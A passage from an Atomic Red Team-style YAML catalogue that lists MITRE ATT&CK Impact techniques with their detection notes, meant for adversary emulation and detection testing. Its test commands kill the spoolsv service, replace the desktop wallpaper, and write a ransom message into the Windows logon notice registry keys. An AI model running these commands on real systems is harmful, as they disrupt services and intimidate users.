      auto_generated_guid: f3191b84-c38b-400b-867e-3a217a27795f
      description: |
        Stops a specified service killng the service's process.
        This technique was used by WannaCry. Upon execution, if the spoolsv service was running "SUCCESS: The process "spoolsv.exe" with PID 2316 has been terminated."
        will be displayed. If the service was not running "ERROR: The process "spoolsv.exe" not found." will be displayed and it can be
        started by running the cleanup command.
      supported_platforms:
      - windows
      input_arguments:
        process_name:
          description: Name of a process to kill
          type: string
          default: spoolsv.exe
      executor:
        command: 'taskkill.exe /f /im #{process_name}

          '
        name: command_prompt
  T1499.004:
    technique:
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0
      type: attack-pattern
      created: '2020-02-20T15:37:27.052Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1499.004
        url: https://attack.mitre.org/techniques/T1499/004
      - source_name: Sucuri BIND9 August 2015
        url: https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html
        description: Cid, D.. (2015, August 2). BIND9 – Denial of Service Exploit
          in the Wild. Retrieved April 26, 2019.
      modified: '2022-03-25T18:11:13.604Z'
      name: Application or System Exploitation
      description: "Adversaries may exploit software vulnerabilities that can cause
        an application or system to crash and deny availability to users. (Citation:
        Sucuri BIND9 August 2015) Some systems may automatically restart critical
        applications and services when crashes occur, but they can likely be re-exploited
        to cause a persistent denial of service (DoS) condition.\n\nAdversaries may
        exploit known or zero-day vulnerabilities to crash applications and/or systems,
        which may also lead to dependent applications and/or systems to be in a DoS
        condition. Crashed or restarted applications or systems may also have other
        effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485),
        [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service
        Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause
        a DoS condition and deny availability to critical information, applications
        and/or systems. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Attacks targeting web applications may generate logs in the
        web server, application server, and/or database server that can be used to
        identify the type of attack. Externally monitor the availability of services
        that may be targeted by an Endpoint DoS.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Application Log: Application Log Content'
      - 'Sensor Health: Host Status'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_impact_type:
      - Availability
    atomic_tests: []
  T1487:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2e114e45-2c50-404c-804a-3af9564d240e
      type: attack-pattern
      created: '2019-03-19T19:38:27.097Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1487
        url: https://attack.mitre.org/techniques/T1487
      - source_name: Symantec Shamoon 2012
        url: https://www.symantec.com/connect/blogs/shamoon-attacks
        description: Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March
          14, 2019.
      - url: https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html
        description: FireEye. (2016, November 30). FireEye Responds to Wave of Destructive
          Cyber Attacks in Gulf Region. Retrieved January 11, 2017.
        source_name: FireEye Shamoon Nov 2016
      - url: http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/
        description: 'Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack
          Wiper. Retrieved January 11, 2017.'
        source_name: Palo Alto Shamoon Nov 2016
      - source_name: Kaspersky StoneDrill 2017
        url: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf
        description: 'Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill:
          Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.'
      - source_name: Unit 42 Shamoon3 2018
        url: https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/
        description: Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas
          Organization. Retrieved March 14, 2019.
      modified: '2020-02-20T22:11:00.106Z'
      name: Disk Structure Wipe
      description: "Adversaries may corrupt or wipe the disk data structures on hard
        drive necessary to boot systems; targeting specific critical systems as well
        as a large number of systems in a network to interrupt availability to system
        and network resources. \n\nAdversaries may attempt to render the system unable
        to boot by overwriting critical data located in structures such as the master
        boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation:
        FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation:
        Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained
        in disk structures may include the initial executable code for loading an
        operating system or the location of the file system partitions on disk. If
        this information is not present, the computer will not be able to load an
        operating system during the boot process, leaving the computer unavailable.
        [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) may be performed
        in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1488)
        if all sectors of a disk are wiped.\n\nTo maximize impact on the target organization,
        malware designed for destroying disk structures may have worm-like features
        to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078),
        [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [Windows
        Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec
        Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon
        Nov 2016)(Citation: Kaspersky StoneDrill 2017)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Look for attempts to read/write to sensitive locations like
        the master boot record and the disk partition table. Monitor for unusual kernel
        driver installation activity.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_impact_type:
      - Availability
      x_mitre_permissions_required:
      - Administrator
      - root
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1565.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490
      type: attack-pattern
      created: '2020-03-02T14:30:05.252Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1565.003
        url: https://attack.mitre.org/techniques/T1565/003
      - description: 'FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved
          November 6, 2018.'
        url: https://content.fireeye.com/apt/rpt-apt38
        source_name: FireEye APT38 Oct 2018
      - source_name: DOJ Lazarus Sony 2018
        url: https://www.justice.gov/opa/press-release/file/1092091/download
        description: Department of Justice. (2018, September 6). Criminal Complaint
          - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.
      modified: '2022-03-25T19:24:18.545Z'
      name: Runtime Data Manipulation
      description: |-
        Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.

        Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: Inspect important application binary file hashes, locations,
        and modifications for suspicious/unexpected values.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Metadata'
      - 'File: File Modification'
      - 'Process: OS API Execution'
      - 'File: File Deletion'
      - 'File: File Creation'
      x_mitre_impact_type:
      - Integrity
      x_mitre_permissions_required:
      - User
      - Administrator
      - root
      - SYSTEM
    atomic_tests: []
  T1498.002:
    technique:
      modified: '2023-03-30T21:01:41.052Z'
      name: Reflection Amplification
      description: |-
        Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.

        Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: 'Detection of reflection amplification can sometimes be achieved
        before the traffic volume is sufficient to cause impact to the availability
        of the service, but such response time typically requires very aggressive
        monitoring and responsiveness or services provided by an upstream network
        service provider. Typical network throughput monitoring tools such as netflow(Citation:
        Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden
        increases in network or service utilization. Real-time, automated, and qualitative
        study of the network traffic can identify a sudden surge in one type of protocol
        can be used to detect a reflection amplification DoS event as it starts. Often,
        the lead time may be small and the indicator of an event availability of the
        network or service drops. The analysis tools mentioned can then be used to
        determine the type of DoS causing the outage and help with remediation.'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Sensor Health: Host Status'
      - 'Network Traffic: Network Traffic Flow'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01
      created: '2020-03-02T20:08:03.691Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1498/002
        external_id: T1498.002
      - source_name: Cloudflare ReflectionDoS May 2017
        description: Marek Majkowsk, Cloudflare. (2017, May 24). Reflections on reflection
          (attacks). Retrieved April 23, 2019.
        url: https://blog.cloudflare.com/reflections-on-reflections/
      - source_name: Cloudflare DNSamplficationDoS
        description: Cloudflare. (n.d.). What is a DNS amplification attack?. Retrieved
          April 23, 2019.
        url: https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/
      - source_name: Cloudflare NTPamplifciationDoS
        description: Cloudflare. (n.d.). What is a NTP amplificaiton attack?. Retrieved
          April 23, 2019.
        url: https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/
      - source_name: Arbor AnnualDoSreport Jan 2018
        description: Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill
          Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight
          into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide
          Infrastructure Security Report. Retrieved April 22, 2019.
        url: https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf
      - source_name: Cloudflare Memcrashed Feb 2018
        description: Marek Majkowski of Cloudflare. (2018, February 27). Memcrashed
          - Major amplification attacks from UDP port 11211. Retrieved April 18, 2019.
        url: https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
      - source_name: Cisco DoSdetectNetflow
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1499.002:
    technique:
      modified: '2023-03-30T21:01:43.164Z'
      name: Service Exhaustion Flood
      description: |-
        Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.

        One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)

        Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.

        In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.

        Externally monitor the availability of services that may be targeted by an Endpoint DoS.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Sensor Health: Host Status'
      x_mitre_impact_type:
      - Availability
      type: attack-pattern
      id: attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858
      created: '2020-02-20T15:31:43.613Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1499/002
        external_id: T1499.002
      - source_name: Arbor SSLDoS April 2012
        description: 'ASERT Team, Netscout Arbor. (2012, April 24). DDoS Attacks on
          SSL: Something Old, Something New. Retrieved April 22, 2019.'
        url: https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new
      - source_name: Cisco DoSdetectNetflow
        description: Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow.
          Retrieved April 25, 2019.
        url: https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf
      - source_name: Cloudflare HTTPflood
        description: Cloudflare. (n.d.). What is an HTTP flood DDoS attack?. Retrieved
          April 22, 2019.
        url: https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/
      - source_name: Arbor AnnualDoSreport Jan 2018
        description: Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill
          Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight
          into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide
          Infrastructure Security Report. Retrieved April 22, 2019.
        url: https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1491:
    technique:
      x_mitre_platforms:
      - Windows
      - IaaS
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b
      type: attack-pattern
      created: '2019-04-08T17:51:41.390Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1491
        url: https://attack.mitre.org/techniques/T1491
      modified: '2022-03-25T19:34:42.056Z'
      name: Defacement
      description: "Adversaries may modify visual content available internally or
        externally to an enterprise network, thus affecting the integrity of the original
        content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491)
        include delivering messaging, intimidation, or claiming (possibly false) credit
        for an intrusion. Disturbing or offensive images may be used as a part of
        [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause
        user discomfort, or to pressure compliance with accompanying messages. \n"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_detection: "Monitor internal and external websites for unplanned content
        changes. Monitor application logs for abnormal behavior that may indicate
        attempted or successful exploitation. Use deep packet inspection to look for
        artifacts of common exploit traffic, such as SQL injection. Web Application
        Firewalls may detect improper inputs attempting exploitation.\n\n"
      x_mitre_version: '1.3'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'File: File Modification'
      - 'Network Traffic: Network Traffic Content'
      - 'File: File Creation'
      - 'Application Log: Application Log Content'
      x_mitre_impact_type:
      - Integrity
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1491.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103
      created: '2020-02-20T14:31:34.778Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1491.001
        url: https://attack.mitre.org/techniques/T1491/001
      - source_name: Novetta Blockbuster Destructive Malware
        url: https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Destructive Malware Report. Retrieved March 2, 2016.'
      - source_name: Novetta Blockbuster
        url: https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf
        description: 'Novetta Threat Research Group. (2016, February 24). Operation
          Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February
          25, 2016.'
      x_mitre_deprecated: false
      revoked: false
      description: 'An adversary may deface systems internal to an organization in
        an attempt to intimidate or mislead users, thus discrediting the integrity
        of the systems. This may take the form of modifications to internal websites,
        or directly to user systems with the replacement of the desktop wallpaper.(Citation:
        Novetta Blockbuster) Disturbing or offensive images may be used as a part
        of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in
        order to cause user discomfort, or to pressure compliance with accompanying
        messages. Since internally defacing systems exposes an adversary''s presence,
        it often takes place after other intrusion goals have been accomplished.(Citation:
        Novetta Blockbuster Destructive Malware)'
      modified: '2022-07-28T18:55:35.988Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: 'Defacement: Internal Defacement'
      x_mitre_detection: Monitor internal and websites for unplanned content changes.
        Monitor application logs for abnormal behavior that may indicate attempted
        or successful exploitation. Use deep packet inspection to look for artifacts
        of common exploit traffic, such as SQL injection. Web Application Firewalls
        may detect improper inputs attempting exploitation.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Application Log: Application Log Content'
      - 'File: File Creation'
      - 'File: File Modification'
      x_mitre_impact_type:
      - Integrity
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1491.001
    atomic_tests:
    - name: Replace Desktop Wallpaper
      auto_generated_guid: 30558d53-9d76-41c4-9267-a7bd5184bed3
      description: 'Downloads an image from a URL and sets it as the desktop wallpaper.

        '
      supported_platforms:
      - windows
      input_arguments:
        url_of_wallpaper:
          description: URL pointing to the image file you wish to set as wallpaper
          type: url
          default: https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png
        pointer_to_orginal_wallpaper:
          description: Full path to where a file containing the original wallpaper
            location will be saved
          type: string
          default: "$env:TEMP\\T1491.001-OrginalWallpaperLocation"
        wallpaper_location:
          description: Full path to where the downloaded wallpaper image will be saved
          type: string
          default: "$env:TEMP\\T1491.001-newWallpaper.png"
      executor:
        command: "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper
          = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\'
          -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode
          = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public
          class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]
          \n         static extern int SystemParametersInfo (int uAction , int uParam
          , string lpvParam , int fuWinIni) ; \n         \n         public static
          void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
          \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{
          \ \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode
          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{
          \ \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode
          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n
          \   $wc.Dispose()  \n}\n"
        cleanup_command: "$updateWallpapercode = @' \nusing System.Runtime.InteropServices;
          \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\",
          CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo
          (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n
          \        public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
          \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper}
          -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n
          \    add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item
          \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\"
          -ErrorAction Ignore\n"
        name: powershell
    - name: Configure LegalNoticeCaption and LegalNoticeText registry keys to display
        ransom message
      auto_generated_guid: ffcbfaab-c9ff-470b-928c-f086b326089b
      description: "Display ransom message to users at system start-up by configuring
        registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption
        and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck
        Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection),
        \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze
        Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa
        Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook
        Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer
        Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer
        Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo
        Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n"
      supported_platforms:
      - windows
      input_arguments:
        legal_notice_caption:
          description: Title of ransom message
          type: string
          default: PYSA
        legal_notice_text:
          description: Body of ransom message
          type: string
          default: Hi Company, every byte on any types of your devices was encrypted.
            Don't try to use backups because it were encrypted too. To get all your
            data contact us:xxxx@onionmail.org
      executor:
        command: "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
          -Name LegalNoticeCaption).LegalNoticeCaption\n$orgLegalNoticeText = (Get-ItemProperty
          HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name
          LegalNoticeText).LegalNoticeText\n$newLegalNoticeCaption = \"#{legal_notice_caption}\"\n$newLegalNoticeText
          = \"#{legal_notice_text}\"\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
          -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force\nSet-ItemProperty
          HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name
          LegalNoticeText -Value $newLegalNoticeText -Type String -Force      "
        cleanup_command: |
          Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
          Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
        name: powershell
        elevation_required: true
  T1565:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931
      created: '2020-03-02T14:19:22.609Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1565
        url: https://attack.mitre.org/techniques/T1565
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.

        The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.
      modified: '2022-04-19T23:03:02.016Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Data Manipulation
      x_mitre_detection: Where applicable, inspect important file hashes, locations,
        and modifications for suspicious/unexpected values. With some critical processes
        involving transmission of data, manual or out-of-band integrity checking may
        be useful for identifying manipulated data.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: impact
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'File: File Metadata'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'File: File Modification'
      - 'File: File Deletion'
      - 'File: File Creation'
      x_mitre_impact_type:
      - Integrity
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1531:
    technique:
      modified: '2023-03-22T20:39:15.680Z'
      name: Account Access Removal
      description: "Adversaries may interrupt availability of system and network resources
        by inhibiting access to accounts utilized by legitimate users. Accounts may
        be deleted, locked, or manipulated (ex: changed credentials) to remove access
        to accounts. Adversaries may also subsequently log off and/or perform a [System
        Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious
        changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42
        LockerGoga 2019)\n\nIn Windows, [Net](https://attack.mitre.org/software/S0039)
        utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code>
